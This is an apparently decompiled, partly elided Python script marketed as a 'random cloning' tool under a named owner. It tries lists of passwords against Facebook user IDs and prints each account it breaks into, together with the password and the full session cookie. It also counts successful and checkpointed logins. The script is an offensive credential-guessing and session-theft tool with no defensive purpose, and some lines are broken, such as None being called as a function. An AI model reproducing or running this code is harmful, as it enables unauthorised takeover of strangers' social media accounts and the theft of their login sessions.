...
def SAMIR():
    os.system('clear')
    print(logo)
    print(' \033[1;33m[1] \033[1;33mSTART RANDOM CLONING')
    print(' [2] \033[1;33mEXIT')
    opt = input('\n   Choose option >>> ')
    if opt == '1':
        i()
        return None
    None('\n\033[1;33mEXIT\x1b[0;97m')
...
today = date.today()
logo = ("""\033[1;32m
.d8888.  .d8b.  .88b  d88. d888888b d8888b. 
88'  YP d8' `8b 88'YbdP`88   `88'   88  `8D 
`8bo.   88ooo88 88  88  88    88    88oobY' 
  `Y8b. 88~~~88 88  88  88    88    88`8b   
db   8D 88   88 88  88  88   .88.   88 `88. 
`8888Y' YP   YP YP  YP  YP Y888888P 88   YD 
                                            
  \033[1;35m                                          
┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
┃ Tools    : RANDOM CLONE               ┃
┃ Owner    : SADMAN SAMIR SNIGDHO       ┃
┃ Facebook : SNIGDHO AFRIDI             ┃
┃ What'sapp: +8801324313100             ┃
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛""")
loop = 0
oks = []
cps = []
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('    \33[1;30m(SAMIR-OK 💚)  ' +uid+ ' | ' +ps+    '  \n \033[1;33mCookie = \033[1;32m'+coki+  ' \n '+pro+'  \033[0;97m')
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print('   \033[1;32m(SAMIR-OK 💚)  ' +uid+ ' | ' +ps+           '  \33[0;97m')
                ...
                continue
        loop+=1
        sys.stdout.write('\r %s[SAMIR] [%s/%s]  CP:- %s  OK:- %s \r'%(H,loop,tl,len(oks),len(cps))),
        sys.stdout.flush()
    except:
        pass
